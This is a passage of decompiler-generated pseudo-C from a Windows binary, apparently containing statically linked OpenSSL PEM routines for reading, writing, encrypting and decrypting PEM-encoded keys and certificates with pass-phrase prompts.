  if ( !v2 )
  {
LABEL_5:
    sub_414690(dword_538F60);
    sub_42C1A0();
    sub_414690(dword_538F64);
    dword_538B18 = CurrentThreadId;
    sub_4146B0(dword_538F64);
    dword_538F6C = 1;
  }
  if ( !dword_538F54 )
  {
    sub_42C290();
    dword_538F54 = 1;
  }
  v3 = dbl_538F58 >= 32.0;
  if ( !v2 )
  {
    dword_538F6C = 0;
    sub_42C1D0();
    sub_4146B0(dword_538F60);
  }
  return v3;
}
// 538B18: using guessed type int dword_538B18;
// 538F54: using guessed type int dword_538F54;
// 538F58: using guessed type double dbl_538F58;
// 538F6C: using guessed type int dword_538F6C;
// 538F70: using guessed type int dword_538F70;

//----- (0041A6D0) --------------------------------------------------------
int sub_41A6D0()
{
  return sub_42AE00(&stru_538F78);
}

//----- (0041A6E0) --------------------------------------------------------
int __cdecl sub_41A6E0(_DWORD *a1)
{
  if ( a1[6] )
    return sub_42AC30((int *)&stru_538F78, (int)sub_41A6D0, a1, &dword_4F1E10, 1, 0);
  else
    return 1;
}
// 4F1E10: using guessed type int dword_4F1E10;

//----- (0041A710) --------------------------------------------------------
int __cdecl sub_41A710(_DWORD *a1)
{
  if ( a1[6] )
    return sub_42AC30((int *)&stru_538F78, (int)sub_41A6D0, a1, &dword_4F1E10, 1, 1);
  else
    return 1;
}
// 4F1E10: using guessed type int dword_4F1E10;

//----- (0041A740) --------------------------------------------------------
_DWORD *sub_41A740()
{
  return sub_42AE50((int *)&stru_538F78, 1);
}

//----- (0041A750) --------------------------------------------------------
int __cdecl sub_41A750(int (__cdecl *a1)(int, void **, int), const char *a2, _DWORD *a3, int a4, int a5, void *a6)
{
  int result; // eax
  int v7; // esi
  void *Block; // [esp+0h] [ebp-Ch] BYREF
  void *v9; // [esp+4h] [ebp-8h] BYREF
  int v10; // [esp+8h] [ebp-4h] BYREF

  v9 = 0;
  Block = 0;
  result = sub_41C0B0(&Block, (int)&v10, 0, a2, a3, a5, a6);
  if ( result )
  {
    v9 = Block;
    v7 = a1(a4, &v9, v10);
    if ( !v7 )
      sub_408310(9, 103, 13, (int)"crypto\\pem\\pem_oth.c", 33);
    sub_413490(Block);
    return v7;
  }
  return result;
}

//----- (0041A7F0) --------------------------------------------------------
int __cdecl sub_41A7F0(int a1, int *a2)
{
  int v2; // esi
  int result; // eax

  v2 = *a2;
  if ( a1 != 1 )
    return 1;
  result = (int)sub_426AF0();
  *(_DWORD *)(v2 + 24) = result;
  if ( result )
    return 1;
  return result;
}

//----- (0041A820) --------------------------------------------------------
void *sub_41A820()
{
  return &unk_4F1EF8;
}

//----- (0041A830) --------------------------------------------------------
int __cdecl sub_41A830(void *a1, signed int Size, int a3, const char *Src)
{
  signed int v4; // esi
  int result; // eax
  char *v6; // ebp
  void *v7; // esi
  FILE *v8; // eax

  if ( Src )
  {
    v4 = strlen(Src);
    if ( v4 > Size )
      v4 = Size;
    memcpy(a1, Src, v4);
    return v4;
  }
  else
  {
    v6 = sub_42FFC0();
    if ( !v6 )
      v6 = "Enter PEM pass phrase:";
    v7 = a3 != 0 ? (void *)4 : 0;
    if ( sub_42FFE0(a1, v7, Size, v6, a3) )
    {
LABEL_11:
      sub_408310(9, 100, 109, (int)"crypto\\pem\\pem_lib.c", 64);
      memset(a1, 0, Size);
      return -1;
    }
    else
    {
      while ( 1 )
      {
        result = strlen((const char *)a1);
        if ( !v7 || result >= (int)v7 )
          break;
        v8 = (FILE *)sub_4DA3E6();
        fprintf(v8 + 2, "phrase is too short, needs to be at least %d chars\n", v7);
        if ( sub_42FFE0(a1, v7, Size, v6, a3) )
          goto LABEL_11;
      }
    }
  }
  return result;
}

//----- (0041A910) --------------------------------------------------------
int __cdecl sub_41A910(char *a1, int a2)
{
  const char *v2; // edi

  if ( a2 == 10 )
  {
    v2 = "ENCRYPTED";
  }
  else if ( a2 == 30 )
  {
    v2 = "MIC-CLEAR";
  }
  else
  {
    v2 = "MIC-ONLY";
    if ( a2 != 20 )
      v2 = "BAD-TYPE";
  }
  sub_4248C0(a1, "Proc-Type: 4,", 0x400u);
  sub_4248C0(a1, v2, 0x400u);
  return sub_4248C0(a1, "\n", 0x400u);
}

//----- (0041A980) --------------------------------------------------------
char *__cdecl sub_41A980(char *a1, const char *a2, int a3, int a4)
{
  char *result; // eax
  char *v5; // ebp
  int v6; // eax
  char *v7; // ecx

  sub_4248C0(a1, "DEK-Info: ", 0x400u);
  sub_4248C0(a1, a2, 0x400u);
  sub_4248C0(a1, ",", 0x400u);
  result = (char *)strlen(a1);
  v5 = result;
  if ( (int)&result[2 * a3 + 1] <= 1024 )
  {
    v6 = 0;
    if ( a3 > 0 )
    {
      v7 = &v5[(_DWORD)a1];
      do
      {
        *v7 = byte_4F1F84[*(unsigned __int8 *)(v6 + a4) >> 4];
        v7[1] = byte_4F1F84[*(_BYTE *)(v6 + a4) & 0xF];
        ++v6;
        v7 += 2;
      }
      while ( v6 < a3 );
    }
    result = &v5[2 * v6 + (_DWORD)a1];
    *result = 10;
    result[1] = 0;
  }
  return result;
}

//----- (0041AA30) --------------------------------------------------------
int __cdecl sub_41AA30(
        int *a1,
        char *Src,
        size_t *a3,
        int (__cdecl *a4)(char *, int, _DWORD, const char *),
        const char *a5)
{
  bool v5; // zf
  int result; // eax
  int v7; // eax
  int *v8; // eax
  _DWORD *v9; // edi
  int v10; // esi
  size_t *v11; // ebx
  int v12; // [esp-14h] [ebp-468h]
  char *v13; // [esp-10h] [ebp-464h]
  size_t Size; // [esp+8h] [ebp-44Ch] BYREF
  size_t *v15; // [esp+Ch] [ebp-448h]
  _BYTE v16[64]; // [esp+10h] [ebp-444h] BYREF
  char v17[1024]; // [esp+50h] [ebp-404h] BYREF

  v5 = *a1 == 0;
  v15 = a3;
  Size = *a3;
  if ( v5 )
    return 1;
  if ( a4 )
    v7 = a4(v17, 1024, 0, a5);
  else
    v7 = sub_41A830(v17, 1024, 0, a5);
  if ( v7 > 0 )
  {
    v12 = v7;
    v8 = (int *)sub_4303E0();
    result = sub_4300E0(*a1, v8, (int)(a1 + 1), (int)v17, v12, 1u, (int)v16, 0);
    if ( result )
    {
      result = (int)sub_405990();
      v9 = (_DWORD *)result;
      if ( result )
      {
        v10 = sub_4065D0((int **)result, (int *)*a1, 0, (int)v16, a1 + 1);
        if ( v10
          && (v10 = sub_405D40(v9, Src, (int *)&Size, Src, Size)) != 0
          && (v11 = v15, v13 = &Src[Size], *v15 = Size, (v10 = sub_405F00(v9, (int)v13, (int *)&Size)) != 0) )
        {
          *v11 += Size;
        }
        else
        {
          sub_408310(9, 106, 101, (int)"crypto\\pem\\pem_lib.c", 445);
        }
        sub_4059B0(v9);
        sub_4139E0(v17, 0x400u);
        sub_4139E0(v16, 0x40u);
        return v10;
      }
    }
  }
  else
  {
    sub_408310(9, 106, 104, (int)"crypto\\pem\\pem_lib.c", 418);
    return 0;
  }
  return result;
}
// 41AA30: using guessed type _BYTE var_444[64];

//----- (0041AC00) --------------------------------------------------------
int __cdecl sub_41AC00(char **a1, char *a2)
{
  signed int Size; // ecx
  signed int v3; // esi
  char *v4; // edi
  int v5; // ebp
  int v6; // esi
  int v7; // eax
  char v8; // bl
  char *v9; // eax
  char v10; // bl

  v3 = Size;
  v4 = *a1;
  if ( Size > 0 )
    memset(a2, 0, Size);
  v5 = 2 * v3;
  v6 = 0;
  if ( v5 <= 0 )
  {
LABEL_6:
    *a1 = v4;
    return 1;
  }
  else
  {
    while ( 1 )
    {
      v7 = sub_424920(*v4);
      v8 = v7;
      if ( v7 < 0 )
        break;
      v9 = &a2[v6 / 2];
      v10 = v8 << (4 * ((v6++ & 1) == 0));
      ++v4;
      *v9 |= v10;
      if ( v6 >= v5 )
        goto LABEL_6;
    }
    sub_408310(9, 101, 103, (int)"crypto\\pem\\pem_lib.c", 556);
    return 0;
  }
}
// 41AC07: variable 'Size' is possibly undefined

//----- (0041ACA0) --------------------------------------------------------
int __cdecl sub_41ACA0(int a1, const char *a2, const char *a3, int a4, int a5)
{
  _BYTE *v5; // ebp
  _DWORD *v6; // eax
  int v8; // esi
  int v9; // eax
  int v10; // edi
  int v11; // ebx
  int v12; // esi
  int v13; // ecx
  int v14; // eax
  int v15; // eax
  int v16; // edi
  int v17; // [esp+10h] [ebp-14h] BYREF
  void *Block; // [esp+14h] [ebp-10h]
  int i; // [esp+18h] [ebp-Ch]
  int v20; // [esp+1Ch] [ebp-8h]
  int v21; // [esp+20h] [ebp-4h]

  v5 = 0;
  v6 = sub_4303F0();
  Block = v6;
  v20 = 7;
  if ( !v6 )
    goto LABEL_2;
  sub_430430(v6);
  v8 = strlen(a2);
  v21 = v8;
  if ( sub_405110(a1, (int)"-----BEGIN ", 11) != 11 )
    goto LABEL_3;
  if ( sub_405110(a1, (int)a2, v8) != v8 )
    goto LABEL_3;
  if ( sub_405110(a1, (int)"-----\n", 6) != 6 )
    goto LABEL_3;
  v9 = strlen(a3);
  if ( v9 > 0 && (sub_405110(a1, (int)a3, v9) != v9 || sub_405110(a1, (int)"\n", 1) != 1) )
    goto LABEL_3;
  v5 = sub_4133F0(0x2000u);
  if ( !v5 )
  {
LABEL_2:
    v20 = 65;
    goto LABEL_3;
  }
  v10 = a5;
  v11 = 0;
  for ( i = 0; v10 > 0; v11 += v12 )
  {
    v12 = 5120;
    if ( v10 <= 5120 )
      v12 = v10;
    if ( !sub_430700((unsigned __int8 *)Block, v5, (unsigned int *)&v17, (char *)(v11 + a4), v12) )
      goto LABEL_3;
    v13 = v17;
    if ( v17 )
    {
      v14 = sub_405110(a1, (int)v5, v17);
      v13 = v17;
      if ( v14 != v17 )
        goto LABEL_3;
    }
    i += v13;
    v10 -= v12;
  }
  sub_430850((int)Block, v5, &v17);
  if ( v17 > 0 && (v15 = sub_405110(a1, (int)v5, v17), v15 != v17)
    || sub_405110(a1, (int)"-----END ", 9) != 9
    || (v16 = v21, sub_405110(a1, (int)a2, v21) != v16)
    || sub_405110(a1, (int)"-----\n", 6) != 6 )
  {
LABEL_3:
    sub_4134B0(v5, 0x2000);
    sub_430410(Block);
    sub_408310(9, 114, v20, (int)"crypto\\pem\\pem_lib.c", 642);
    return 0;
  }
  sub_4134B0(v5, 0x2000);
  sub_430410(Block);
  return i + v17;
}

//----- (0041AF10) --------------------------------------------------------
int __cdecl sub_41AF10(_DWORD *a1, _DWORD *a2, int a3, int a4, _DWORD *a5)
{
  void **v6; // edi
  void *v7; // esi
  void *v8; // eax
  int v9; // eax
  int v10; // eax
  unsigned int v11; // kr00_4
  int v12; // edi
  int i; // esi
  int v14; // esi
  size_t v15; // esi
  void *v16; // esi
  int v17; // esi
  int v18; // esi
  signed int v19; // esi
  void *v20; // edi
  int v21; // eax
  int v22; // eax
  void *v23; // eax
  _DWORD *v24; // ebp
  size_t v25; // esi
  void *v26; // esi
  bool v27; // zf
  int v28; // eax
  _DWORD *v29; // edi
  _DWORD *v30; // ebx
  void *v31; // esi
  void *v32; // edi
  int v33; // [esp+8h] [ebp-134h] BYREF
  void *v34; // [esp+Ch] [ebp-130h]
  void *v35; // [esp+10h] [ebp-12Ch]
  void *Block; // [esp+14h] [ebp-128h]
  void *v37; // [esp+18h] [ebp-124h]
  int v38; // [esp+1Ch] [ebp-120h]
  int v39; // [esp+20h] [ebp-11Ch]
  _DWORD *v40; // [esp+24h] [ebp-118h]
  _DWORD *v41; // [esp+28h] [ebp-114h]
  _DWORD *v42; // [esp+2Ch] [ebp-110h]
  _DWORD *v43; // [esp+30h] [ebp-10Ch]
  int v44; // [esp+34h] [ebp-108h] BYREF
  char Str1[9]; // [esp+38h] [ebp-104h] BYREF
  char Str2[2]; // [esp+41h] [ebp-FBh] BYREF
  char Src[245]; // [esp+43h] [ebp-F9h] BYREF

  v42 = a2;
  v40 = (_DWORD *)a3;
  v41 = (_DWORD *)a4;
  v43 = a5;
  v37 = sub_4303F0();
  v38 = 0;
  v33 = 0;
  v39 = 0;
  if ( !v37 )
  {
    sub_408310(9, 109, 65, (int)"crypto\\pem\\pem_lib.c", 675);
    return 0;
  }
  v6 = (void **)sub_4197E0();
  Block = v6;
  v7 = sub_4197E0();
  v35 = v7;
  v8 = sub_4197E0();
  v34 = v8;
  if ( v6 && v7 && v8 )
  {
    Src[243] = 0;
    v9 = sub_405290(a1, (int)Str1, 254);
    if ( v9 <= 0 )
    {
LABEL_12:
      sub_408310(9, 109, 108, (int)"crypto\\pem\\pem_lib.c", 691);
    }
    else
    {
      while ( 1 )
      {
        do
        {
          if ( Str1[v9] > 32 )
            break;
          --v9;
        }
        while ( v9 >= 0 );
        v10 = v9 + 1;
        Str1[v10] = 10;
        Str1[v10 + 1] = 0;
        if ( !strncmp(Str1, "-----BEGIN ", 0xBu) )
        {
          v11 = strlen(Src);
          if ( !strncmp(&Str1[v11 + 5], "-----\n", 6u) )
            break;
        }
        v9 = sub_405290(a1, (int)Str1, 254);
        if ( v9 <= 0 )
          goto LABEL_12;
      }
      if ( sub_4198C0((int)v6, v11 + 9) )
      {
        memcpy(v6[1], Src, v11 - 6);
        *((char *)v6[1] + v11 - 6) = 0;
        v12 = 0;
        if ( sub_4198C0((int)v35, 0x100u) )
        {
          **((_BYTE **)v35 + 1) = 0;
          for ( i = sub_405290(a1, (int)Str1, 254); i > 0; i = sub_405290(a1, (int)Str1, 254) )
          {
            do
            {
              if ( Str1[i] > 32 )
                break;
              --i;
            }
            while ( i >= 0 );
            v14 = i + 1;
            Str1[v14] = 10;
            v15 = v14 + 1;
            Str1[v15] = 0;
            if ( Str1[0] == 10 )
              break;
            if ( !sub_4198C0((int)v35, v15 + v12 + 9) )
            {
              sub_408310(9, 109, 65, (int)"crypto\\pem\\pem_lib.c", 733);
              goto LABEL_58;
            }
            if ( !strncmp(Str1, "-----END ", 9u) )
            {
              v39 = 1;
              break;
            }
            memcpy((void *)(v12 + *((_DWORD *)v35 + 1)), Str1, v15);
            *(_BYTE *)(v15 + *((_DWORD *)v35 + 1) + v12) = 0;
            v12 += v15;
          }
          v16 = v34;
          v33 = 0;
          if ( sub_4198C0((int)v34, 0x400u) )
          {
            **((_BYTE **)v34 + 1) = 0;
            if ( v39 )
            {
              v23 = v35;
              v33 = v12;
              v35 = v16;
              v34 = v23;
              v20 = v23;
            }
            else
            {
              v17 = sub_405290(a1, (int)Str1, 254);
              if ( v17 > 0 )
              {
                while ( 1 )
                {
                  do
                  {
                    if ( Str1[v17] > 32 )
                      break;
                    --v17;
                  }
                  while ( v17 >= 0 );
                  v18 = v17 + 1;
                  Str1[v18] = 10;
                  v19 = v18 + 1;
                  Str1[v19] = 0;
                  if ( v19 != 65 )
                    v38 = 1;
                  if ( !strncmp(Str1, "-----END ", 9u) || v19 > 65 )
                    break;
                  v20 = v34;
                  if ( !sub_4199A0((int)v34, v19 + v33 + 9) )
                  {
                    sub_408310(9, 109, 65, (int)"crypto\\pem\\pem_lib.c", 769);
                    goto LABEL_58;
                  }
                  memcpy((void *)(v33 + *((_DWORD *)v34 + 1)), Str1, v19);
                  *(_BYTE *)(v19 + *((_DWORD *)v34 + 1) + v33) = 0;
                  v33 += v19;
                  if ( v38 )
                  {
                    Str1[0] = 0;
                    v21 = sub_405290(a1, (int)Str1, 254);
                    if ( v21 > 0 )
                    {
                      do
                      {
                        if ( Str1[v21] > 32 )
                          break;
                        --v21;
                      }
                      while ( v21 >= 0 );
                      v22 = v21 + 1;
                      Str1[v22] = 10;
                      Str1[v22 + 1] = 0;
                    }
                    goto LABEL_48;
                  }
                  v17 = sub_405290(a1, (int)Str1, 254);
                  if ( v17 <= 0 )
                    goto LABEL_48;
                }
              }
              v20 = v34;
            }
LABEL_48:
            v24 = Block;
            v25 = strlen(*((const char **)Block + 1));
            if ( !strncmp(Str1, "-----END ", 9u)
              && !strncmp(*((const char **)Block + 1), Str2, v25)
              && !strncmp(&Str2[v25], "-----\n", 6u) )
            {
              v26 = v37;
              sub_430540(v37);
              if ( sub_430890((int *)v37, *((_BYTE **)v20 + 1), &v33, *((unsigned __int8 **)v20 + 1), v33) >= 0 )
              {
                if ( sub_4306B0((int)v26, (_BYTE *)(v33 + *((_DWORD *)v20 + 1)), &v44) >= 0 )
                {
                  v27 = v44 + v33 == 0;
                  v28 = v44 + v33;
                  v33 += v44;
                  if ( !v27 )
                  {
                    v29 = v40;
                    v30 = v41;
                    *v42 = v24[1];
                    v31 = v35;
                    *v29 = *((_DWORD *)v35 + 1);
                    v32 = v34;
                    *v30 = *((_DWORD *)v34 + 1);
                    *v43 = v28;
                    sub_413490(v24);
                    sub_413490(v31);
                    sub_413490(v32);
                    sub_430410(v37);
                    return 1;
                  }
                }
                else
                {
                  sub_408310(9, 109, 100, (int)"crypto\\pem\\pem_lib.c", 813);
                }
              }
              else
              {
                sub_408310(9, 109, 100, (int)"crypto\\pem\\pem_lib.c", 808);
              }
            }
            else
            {
              sub_408310(9, 109, 102, (int)"crypto\\pem\\pem_lib.c", 799);
            }
          }
          else
          {
            sub_408310(9, 109, 65, (int)"crypto\\pem\\pem_lib.c", 747);
          }
        }
        else
        {
          sub_408310(9, 109, 65, (int)"crypto\\pem\\pem_lib.c", 716);
        }
      }
      else
      {
        sub_408310(9, 109, 65, (int)"crypto\\pem\\pem_lib.c", 706);
      }
    }
  }
LABEL_58:
  sub_419810(Block);
  sub_419810(v35);
  sub_419810(v34);
  sub_430410(v37);
  return 0;
}
// 41AF10: using guessed type char Str2[2];

//----- (0041B4C0) --------------------------------------------------------
int __cdecl sub_41B4C0(const char *a1, const char *a2)
{
  signed int v2; // ecx
  unsigned int v3; // eax
  const char *v5; // ecx

  v2 = strlen(a1);
  v3 = strlen(a2);
  if ( (int)(v3 + 1) < v2 && (v5 = &a1[v2 - v3], !strcmp(v5, a2)) && *(v5 - 1) == 32 )
    return v5 - 1 - a1;
  else
    return 0;
}

//----- (0041B540) --------------------------------------------------------
int __usercall sub_41B540@<eax>(const char *a1@<ecx>, char *a2@<edi>)
{
  volatile LONG *v4; // eax
  int v5; // eax
  volatile LONG *v6; // eax
  int v7; // eax
  BOOL v8; // esi
  int v9; // [esp+4h] [ebp-4h] BYREF

  if ( !strcmp(a2, a1) )
    return 1;
  if ( !strcmp(a1, "ANY PRIVATE KEY") )
  {
    if ( !strcmp(a2, "ENCRYPTED PRIVATE KEY") || !strcmp(a2, "PRIVATE KEY") )
      return 1;
    v4 = (volatile LONG *)sub_41B4C0(a2, "PRIVATE KEY");
    if ( (int)v4 > 0 )
    {
      v5 = sub_430B10(0, a2, v4);
      if ( v5 )
      {
        if ( *(_DWORD *)(v5 + 96) )
          return 1;
      }
    }
  }
  else if ( !strcmp(a1, "PARAMETERS") )
  {
    v6 = (volatile LONG *)sub_41B4C0(a2, "PARAMETERS");
    if ( (int)v6 > 0 )
    {
      v7 = sub_430B10((volatile LONG **)&v9, a2, v6);
      if ( v7 )
      {
        v8 = *(_DWORD *)(v7 + 60) != 0;
        sub_4162A0((volatile LONG *)v9);
        return v8;
      }
    }
  }
  else if ( !strcmp(a2, "X9.42 DH PARAMETERS") && !strcmp(a1, "DH PARAMETERS")
         || !strcmp(a2, "X509 CERTIFICATE") && !strcmp(a1, "CERTIFICATE")
         || !strcmp(a2, "NEW CERTIFICATE REQUEST") && !strcmp(a1, "CERTIFICATE REQUEST")
         || !strcmp(a2, "CERTIFICATE") && !strcmp(a1, "TRUSTED CERTIFICATE")
         || !strcmp(a2, "X509 CERTIFICATE") && !strcmp(a1, "TRUSTED CERTIFICATE")
         || !strcmp(a2, "CERTIFICATE") && !strcmp(a1, "PKCS7")
         || !strcmp(a2, "PKCS #7 SIGNED DATA") && !strcmp(a1, "PKCS7")
         || !strcmp(a2, "CERTIFICATE") && !strcmp(a1, "CMS")
         || !strcmp(a2, "PKCS7") && !strcmp(a1, "CMS") )
  {
    return 1;
  }
  return 0;
}

//----- (0041BA70) --------------------------------------------------------
int __cdecl sub_41BA70(
        int (__cdecl *a1)(int, char **),
        const char *a2,
        int a3,
        int a4,
        int *a5,
        int a6,
        int a7,
        int (__cdecl *a8)(char *, int, int, void *),
        void *a9)
{
  char *v9; // ebx
  int v10; // eax
  int v11; // eax
  char *v12; // eax
  size_t v13; // ecx
  char *v14; // ebp
  int v15; // eax
  int v16; // edi
  void *v17; // esp
  int *v18; // eax
  int v19; // eax
  _DWORD *v20; // edi
  size_t Size; // [esp+18h] [ebp-484h] BYREF
  int v23; // [esp+1Ch] [ebp-480h]
  char *v24; // [esp+20h] [ebp-47Ch]
  int v25; // [esp+24h] [ebp-478h] BYREF
  int v26; // [esp+28h] [ebp-474h]
  void *Block; // [esp+2Ch] [ebp-470h]
  char *v28; // [esp+30h] [ebp-46Ch]
  void *v29; // [esp+34h] [ebp-468h]
  const char *v30; // [esp+38h] [ebp-464h]
  int v31; // [esp+3Ch] [ebp-460h]
  char *v32; // [esp+40h] [ebp-45Ch] BYREF
  int (__cdecl *v33)(char *, int, int, void *); // [esp+44h] [ebp-458h]
  char Src[16]; // [esp+48h] [ebp-454h] BYREF
  _BYTE v35[64]; // [esp+58h] [ebp-444h] BYREF
  char v36[1024]; // [esp+98h] [ebp-404h] BYREF

  v30 = a2;
  v33 = a8;
  v31 = a3;
  v9 = 0;
  v24 = (char *)a6;
  v29 = a9;
  Block = 0;
  v26 = 0;
  Size = 0;
  v25 = 0;
  v23 = 0;
  v28 = 0;
  if ( a5 )
  {
    v10 = sub_435D30((int)a5);
    v28 = sub_4233A0(v10);
    if ( !v28 || !sub_407400((int)a5) )
    {
      sub_408310(9, 105, 113, (int)"crypto\\pem\\pem_lib.c", 309);
      goto LABEL_34;
    }
  }
  v11 = a1(a4, 0);
  v26 = v11;
  if ( v11 < 0 )
  {
    sub_408310(9, 105, 13, (int)"crypto\\pem\\pem_lib.c", 315);
    v26 = 0;
    goto LABEL_34;
  }
  v12 = (char *)sub_4133F0(v11 + 20);
  v9 = v12;
  if ( !v12 )
  {
    sub_408310(9, 105, 65, (int)"crypto\\pem\\pem_lib.c", 323);
    goto LABEL_34;
  }
  v32 = v12;
  v13 = a1(a4, &v32);
  Size = v13;
  if ( !a5 )
  {
    v23 = 1;
    v36[0] = 0;
    goto LABEL_32;
  }
  v14 = v24;
  if ( v24 )
  {
    v16 = a7;
  }
  else
  {
    if ( v33 )
      v15 = v33(v36, 1024, 1, v29);
    else
      v15 = sub_41A830(v36, 1024, 1, (const char *)v29);
    v16 = v15;
    if ( v15 <= 0 )
    {
      sub_408310(9, 105, 111, (int)"crypto\\pem\\pem_lib.c", 336);
      goto LABEL_34;
    }
    v13 = Size;
    v14 = v36;
  }
  v17 = alloca(8);
  sub_406F80((int)v9, v13, 0.0);
  if ( sub_407400((int)a5) > 16 )
    sub_417C70("assertion failed: EVP_CIPHER_iv_length(enc) <= (int)sizeof(iv)", "crypto\\pem\\pem_lib.c", 346);
  sub_407400((int)a5);
  if ( sub_406FF0() > 0 )
  {
    v18 = (int *)sub_4303E0();
    if ( sub_4300E0((int)a5, v18, (int)Src, (int)v14, v16, 1u, (int)v35, 0) )
    {
      if ( v14 == v36 )
        sub_4139E0(v36, 0x400u);
      if ( strlen(v28) + 2 * sub_407400((int)a5) + 36 > 0x400 )
        sub_417C70(
          "assertion failed: strlen(objstr) + 23 + 2 * EVP_CIPHER_iv_length(enc) + 13 <= sizeof buf",
          "crypto\\pem\\pem_lib.c",
          360);
      v36[0] = 0;
      sub_41A910(v36, 10);
      v19 = sub_407400((int)a5);
      sub_41A980(v36, v28, v19, (int)Src);
      v23 = 1;
      v20 = sub_405990();
      Block = v20;
      if ( !v20
        || !sub_4065A0((int **)v20, a5, 0, (int)v35, Src)
        || !sub_405A00(v20, v9, &v25, v9, Size)
        || !sub_405C50(v20, (int)&v9[v25], &Size) )
      {
        goto LABEL_33;
      }
      v13 = v25 + Size;
      Size += v25;
LABEL_32:
      Size = sub_41ACA0(v31, v30, v36, (int)v9, v13);
      if ( (int)Size > 0 )
        goto LABEL_34;
LABEL_33:
      v23 = 0;
    }
  }
LABEL_34:
  sub_4139E0(v35, 0x40u);
  sub_4139E0(Src, 0x10u);
  sub_4059B0(Block);
  sub_4139E0(v36, 0x400u);
  sub_4134B0(v9, v26);
  return v23;
}
// 41BA70: using guessed type _BYTE var_444[64];

//----- (0041BE70) --------------------------------------------------------
BOOL __cdecl sub_41BE70(char *Str1, char *a2)
{
  char *v2; // ebp
  char *v3; // esi
  char *v5; // esi
  char v6; // al
  _BYTE *v7; // esi
  char v8; // cl
  const char *v9; // esi
  const char *v10; // esi
  const char *v11; // esi
  size_t v12; // eax
  char v13; // dl
  const char *v14; // esi
  const char *v15; // edi
  size_t v16; // eax
  char v17; // bl
  char *v18; // esi
  int v19; // edi
  char *v20; // esi
  int v21; // eax
  bool v22; // zf
  char v23; // cl

  v2 = a2;
  v3 = Str1;
  *(_DWORD *)a2 = 0;
  if ( !v3 || !*v3 || *v3 == 10 )
    return 1;
  if ( strncmp(v3, "Proc-Type:", 0xAu) )
  {
    sub_408310(9, 107, 107, (int)"crypto\\pem\\pem_lib.c", 479);
    return 0;
  }
  v5 = &v3[strspn(v3 + 10, " \t") + 10];
  v6 = *v5;
  v7 = v5 + 1;
  if ( v6 != 52 )
    return 0;
  v8 = *v7;
  v9 = v7 + 1;
  if ( v8 != 44 )
    return 0;
  v10 = &v9[strspn(v9, " \t")];
  if ( !strncmp(v10, "ENCRYPTED", 9u) && (v11 = v10 + 9, strspn(v11, " \t\r\n")) )
  {
    v12 = strspn(v11, " \t\r");
    v13 = v11[v12];
    v14 = &v11[v12 + 1];
    if ( v13 != 10 )
    {
      sub_408310(9, 107, 112, (int)"crypto\\pem\\pem_lib.c", 498);
      return 0;
    }
    if ( strncmp(v14, "DEK-Info:", 9u) )
    {
      sub_408310(9, 107, 105, (int)"crypto\\pem\\pem_lib.c", 507);
      return 0;
    }
    v15 = &v14[strspn(v14 + 9, " \t") + 9];
    v16 = strcspn(v15, " \t,");
    v17 = v15[v16];
    v18 = (char *)&v15[v16];
    *v18 = 0;
    v19 = sub_430D50((int)v15);
    *(_DWORD *)v2 = v19;
    *v18 = v17;
    v20 = &v18[strspn(v18, " \t")];
    Str1 = v20;
    if ( !v19 )
    {
      sub_408310(9, 107, 114, (int)"crypto\\pem\\pem_lib.c", 526);
      return 0;
    }
    v21 = sub_407400(v19);
    v22 = v21 == 0;
    if ( v21 > 0 )
    {
      v23 = *v20++;
      Str1 = v20;
      if ( v23 != 44 )
      {
        sub_408310(9, 107, 129, (int)"crypto\\pem\\pem_lib.c", 531);
        return 0;
      }
      v22 = v21 == 0;
    }
    if ( v22 && *v20 == 44 )
    {
      sub_408310(9, 107, 130, (int)"crypto\\pem\\pem_lib.c", 534);
      return 0;
    }
    else
    {
      sub_407400(v19);
      return sub_41AC00(&Str1, v2 + 4) != 0;
    }
  }
  else
  {
    sub_408310(9, 107, 106, (int)"crypto\\pem\\pem_lib.c", 492);
    return 0;
  }
}

//----- (0041C0B0) --------------------------------------------------------
int __cdecl sub_41C0B0(_DWORD *a1, int a2, _DWORD *a3, const char *a4, _DWORD *a5, int a6, void *a7)
{
  void *v7; // edi
  BOOL v9; // eax
  void *v10; // ebp
  int v11; // eax
  int *v12; // ecx
  int v13; // esi
  char *Str1; // [esp+10h] [ebp-3Ch] BYREF
  void *Src; // [esp+14h] [ebp-38h] BYREF
  void *Block; // [esp+18h] [ebp-34h] BYREF
  int v17; // [esp+1Ch] [ebp-30h] BYREF
  void *v18; // [esp+20h] [ebp-2Ch]
  int *v19; // [esp+24h] [ebp-28h]
  int v20; // [esp+28h] [ebp-24h]
  int v21; // [esp+2Ch] [ebp-20h]
  _DWORD *v22; // [esp+30h] [ebp-1Ch]
  int v23[5]; // [esp+34h] [ebp-18h] BYREF

  v22 = a1;
  v19 = (int *)a2;
  v18 = a7;
  v20 = a6;
  Block = 0;
  Str1 = 0;
  Src = 0;
  v21 = 0;
  if ( !sub_41AF10(a5, &Block, (int)&Str1, (int)&Src, &v17) )
  {
LABEL_4:
    if ( (sub_408730() & 0xFFF) == 108 )
      sub_408610(2, "Expecting: ", a4);
    return 0;
  }
  while ( 1 )
  {
    v7 = Block;
    if ( sub_41B540(a4, (char *)Block) )
      break;
    sub_413490(v7);
    sub_413490(Str1);
    sub_413490(Src);
    if ( !sub_41AF10(a5, &Block, (int)&Str1, (int)&Src, &v17) )
      goto LABEL_4;
  }
  v9 = sub_41BE70(Str1, (char *)v23);
  v10 = Src;
  if ( v9
    && sub_41AA30(
         v23,
         (char *)Src,
         (size_t *)&v17,
         (int (__cdecl *)(char *, int, _DWORD, const char *))v20,
         (const char *)v18) )
  {
    v11 = v17;
    v12 = v19;
    *v22 = v10;
    *v12 = v11;
    if ( a3 )
      *a3 = v7;
    v13 = 1;
    if ( a3 )
      goto LABEL_15;
  }
  else
  {
    v13 = v21;
  }
  sub_413490(v7);
LABEL_15:
  sub_413490(Str1);
  if ( !v13 )
    sub_413490(v10);
  return v13;
}

//----- (0041C290) --------------------------------------------------------
void *sub_41C290()
{
  return &unk_4F2294;
}

//----- (0041C2A0) --------------------------------------------------------
void *sub_41C2A0()
{
  return &unk_4F2354;
}

//----- (0041C2B0) --------------------------------------------------------
int __usercall sub_41C2B0@<eax>(int a1@<ebx>)
{
  int *v1; // esi
  int v2; // ebp
  _DWORD *v3; // esi
  int v4; // eax
  int v5; // edi
  bool v7; // zf
  _DWORD *v8; // eax
  unsigned int *v9; // eax
  unsigned int *v10; // edi
  int *v11; // esi
  int v12; // eax
  int v13; // ecx
  int v14; // edi
  int v15; // eax
  int v16; // eax
  int v17; // [esp+0h] [ebp-1Ch]
  BOOL v18; // [esp+10h] [ebp-Ch] BYREF
  int v19; // [esp+14h] [ebp-8h]
  int *v20; // [esp+18h] [ebp-4h]

